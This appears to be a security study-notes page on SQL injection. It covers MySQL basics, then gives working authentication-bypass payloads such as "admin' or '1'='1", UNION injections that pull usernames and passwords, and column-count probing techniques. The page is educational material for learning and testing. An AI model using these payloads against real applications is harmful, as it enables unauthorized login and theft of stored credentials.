---
layout: default
title: SQL Injection
permalink: /Web/sqli/
---

# SQL Injection

Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it. This can occur by escaping user-input bounds by injecting a special character like ('), and then writing code to be executed, like JavaScript code or SQL in SQL Injections. Unless the user input is sanitized, it is very likely to execute the injected code and run it.
SQL injection refers to attacks against relational databases such as MySQL (whereas injections against non-relational databases, such as MongoDB, are NoSQL injection).

## MySQL
The `mysql` utility is used to authenticate to and interact with a MySQL/MariaDB database.
```
mysql -u root -h $host -P $port -p
```
*Note: The -p flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file.
However, if you put the password in the command, there shouldn't be any spaces between '-p' and the password.*
*Note: The default MySQL/MariaDB port is 3306.*
### View Databases
```
SHOW DATABASES;
```
### Switch to Database
```
USE database_name;
```
### View Tables
```
SHOW TABLES;
```
### View Table Structure
```
DESCRIBE table_name;
```
## Few SQL Statements
### INSERT
Add new records to a given table.
```
INSERT INTO logins VALUES(1, 'admin', 'password', '2025-07-15');
```
```
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```
### SELECT
Retrieve data.
```
SELECT * FROM table_name;
```
### UPDATE
update specific records.
```
UPDATE logins SET password = 'change_password' WHERE id > 1;
```
### LIMIT
In case our query returns a large number of records, we can limit the results.
```
SELECT * FROM logins LIMIT 2;
```
### WHERE
To filter or search.
```
SELECT * FROM logins WHERE id > 1;
```
### LIKE
Enables selecting records by matching a certain pattern.
Records  with usernames starting with admin:
```
SELECT * FROM logins WHERE username LIKE 'admin%';
```
### SQL Operators
```
SELECT 1 = 1 AND 'test' = 'test';
```
```
SELECT 1 = 1 OR 'test' = 'abc';
```
```
SELECT NOT 1 = 1;
```
The AND, OR and NOT operators can also be represented as &&, || and !, respectively.
```
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```
## Types of SQL Injections
SQL injections typically fall under three categories: In-band SQLi (Union Based or Error Based), Inferential or Blind SQLi (Boolean Based or Time Based) and Out-of-band SQLi:
-  In In-band cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
-  In Blind SQLi we utilize SQL logic to retrieve the output character by character.
-  In Out-of-band case we do not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there.

## Authentication Bypass
### SQLi Discovery
To test whether the login form is vulnerable to SQL injection, we can try to add one of the below payloads (or their URL encoded versions) after our username and see if it causes any errors or changes how the page behaves: `'`, `"`, `#`, `;`, `)`.
### OR Injection
If there is at least one TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE.
Potential payload at a login page:
```
admin' or '1'='1
```
So the final query would be:
```
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
Find a comprehensive list of SQLi auth bypass payloads in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass).
If we don't know a valid username, we can put the same payload into the password fiels.
### Using Comments
We can use two types of line comments with MySQL `--` and `#`, in addition to an in-line comment `/**/` (though this is not usually used in SQL injections). 
*Note: In SQL, using two dashes only is not enough to start a comment, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.*
*Note: If you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.*
Potential payload:
```
admin'--
```
The resulting query:
```
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
### Union Clause
Another type of SQL injection is injecting entire SQL queries executed along with the original query.
The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.
```
SELECT * FROM ports UNION SELECT * FROM ships;
```
*Note: The data types of the selected columns on all positions should be the same.*
*Note: A UNION statement can only operate on SELECT statements with an equal number of columns. For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.*
Potentical payload:
```
1' UNION SELECT username, password from passwords-- '
```
The resulting query:
```
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
If the original query used SELECT on a table with four columns, our UNION injection would be:
```
UNION SELECT username, 2, 3, 4 from passwords-- '
```
The resulting query:
```
SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
```
#### Detect the Number of Columns
##### Using ORDER BY
We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.
Potential payload:
```
' order by 1-- -
```
And then increase the number.
#### Using UNION
Potentical payload:
```
cn' UNION select 1,2,3-- -
```
Then:
```
cn' UNION select 1,2,3,4-- -
```
*Note: It is very common that not every column will be displayed back to the user. This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query.*
*Note: We can also use `@@version` in our SQL query in the place of a cloumn to get data from the database. In MSSQL it returns MSSQL version. Error with other DBMS. We can also try `user()` to get data about the user, etc.*

